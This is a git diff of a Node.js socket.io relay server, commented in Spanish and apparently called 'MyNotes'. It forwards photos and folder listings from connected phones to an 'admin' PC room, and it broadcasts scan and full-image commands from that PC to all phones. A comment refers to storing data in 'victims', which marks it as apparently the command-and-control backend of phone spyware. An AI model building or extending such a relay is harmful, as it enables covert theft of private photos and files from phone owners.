@@ -3,53 +3,67 @@ const app = express();
 const http = require('http');
 const server = http.createServer(app);
 const { Server } = require("socket.io");
+
+// Configuración para permitir archivos grandes (100MB)
 const io = new Server(server, {
     cors: { origin: "*" },
-    maxHttpBufferSize: 1e8 // 100 MB (Permite pasar fotos HD grandes)
+    maxHttpBufferSize: 1e8 
 });
 
-// Ruta básica para saber que está vivo
+const PORT = process.env.PORT || 3000;
+
 app.get('/', (req, res) => {
-  res.send('<h1>Servidor Puente MyNotes Activo 🌉</h1>');
+  res.send('<h1>🌉 Servidor Puente Activo (Modo Electron)</h1>');
 });
 
 io.on('connection', (socket) => {
-    console.log('Un usuario se conectó:', socket.id);
+    console.log(`🔌 Nuevo socket conectado: ${socket.id}`);
 
-    // 1. El PC se identifica como Administrador
+    // --- 1. EL PC SE CONECTA ---
     socket.on('join_admin', () => {
         socket.join('admin_room');
-        console.log("🖥️ PC Admin conectado y unido a la sala");
+        console.log("💻 PC Admin (Electron) se unió a la sala.");
     });
 
-    // 2. Recepción de datos desde el CELULAR (Fotos, Carpetas, etc)
+    // --- 2. EL CELULAR ENVÍA DATOS (EL TÚNEL) ---
     socket.on('usrData', (data) => {
-        // NO GUARDAMOS NADA. Reenviamos directo al PC.
+        // AQUÍ ESTÁ LA CLAVE: No procesamos, solo REENVIAMOS al PC.
+        // El servidor V9 fallaba aquí porque intentaba guardar en 'victims'.
+        
+        // Log para ver en Render si llegan datos
+        if(data.dataType === 'preview_image') {
+            console.log(`📸 Foto recibida del celular: ${data.name} -> Reenviando al PC...`);
+        } else if (data.dataType === 'folder_list') {
+            console.log(`📂 Lista de carpetas recibida -> Reenviando al PC...`);
+        } else {
+            console.log(`📦 Dato recibido (${data.dataType}) -> Reenviando al PC...`);
+        }
+
+        // Enviamos a la sala del PC
         io.to('admin_room').emit('data_from_phone', data);
-        // console.log(`📦 Dato tipo ${data.dataType} reenviado al PC`);
     });
 
-    // 3. Comandos desde el PC hacia el CELULAR
+    // --- 3. EL PC ENVÍA ÓRDENES AL CELULAR ---
     socket.on('command_start_scan', (args) => {
+        console.log("📡 Orden 'Start Scan' recibida del PC -> Enviando a todos los celulares");
         socket.broadcast.emit('command_start_scan', args);
-        console.log("📡 Orden de escaneo enviada");
     });
 
     socket.on('command_stop_scan', () => {
+        console.log("🛑 Orden 'Stop Scan' reenviada");
         socket.broadcast.emit('command_stop_scan');
     });
 
     socket.on('request_full_image', (data) => {
-        // El PC pide una foto HD específica
+        console.log(`🔍 PC pide foto HD: ${data.path}`);
         socket.broadcast.emit('request_full_image', data);
-        console.log("uD83D\uDD0D Solicitando HD:", data.path);
     });
 
     socket.on('disconnect', () => {
-        console.log('Usuario desconectado');
+        console.log(`❌ Socket desconectado: ${socket.id}`);
     });
 });
 
-server.listen(3000, () => {
-  console.log('listening on *:3000');
+server.listen(PORT, () => {
+  console.log(`🚀 Servidor Puente corriendo en puerto ${PORT}`);
 });
